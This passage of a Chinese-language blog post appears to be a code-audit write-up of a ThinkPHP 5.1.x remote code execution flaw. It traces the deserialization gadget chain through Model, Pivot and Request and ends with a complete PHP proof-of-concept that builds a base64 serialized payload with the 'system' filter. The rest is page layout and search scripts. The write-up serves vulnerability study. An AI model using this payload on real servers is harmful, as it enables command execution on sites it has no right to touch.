      &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>input</code>  下 <code>array_walk_recursive</code>  参数都是可控的<br>
+<img src="https://img-blog.csdnimg.cn/df777937e1ff4b9c8bd8746b5cc7c549.png" alt="在这里插入图片描述"><br>
+下面就可以构造了<br>
+这里 <code>Conversion</code>  和 <code>Attribute</code>  都是 trait 关键字，不能直接实例化<br>
+需要去找继承类，要是用 use 关键字，并且同时继承了 <code>Conversion</code>  和 <code>Attribute</code></p>
+<p><code>Model</code>  类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br></pre></td></tr></table></figure>
+<p>但是 <code>Model</code>  是抽象类，还是不能直接实例化<br>
+需要找到其抽象的子类 <code>Pivot</code></p>
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;huha&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># append键必须存在，并且与$this-&gt;data相同</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;huha&quot;</span>=&gt;[]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;huha&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//var_dump(new Windows());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/01/04/Commons%20Collections6(%E6%B0%B4%E7%89%88)/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-01-12 00:29:17
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/thinkphp%E6%A1%86%E6%9E%B6/" title="thinkphp框架">
+                        <b>#</b> thinkphp框架
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/01/28/Struts2-001/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text"> 代码审计</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ThinkPHP5.1.xRCE%E6%BC%8F%E6%B4%9E + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F01%2F12%2FThinkPHP5.1.xRCE%25E6%25BC%258F%25E6%25B4%259E%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/01/12/ThinkPHP5.1.xRCE%E6%BC%8F%E6%B4%9E/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
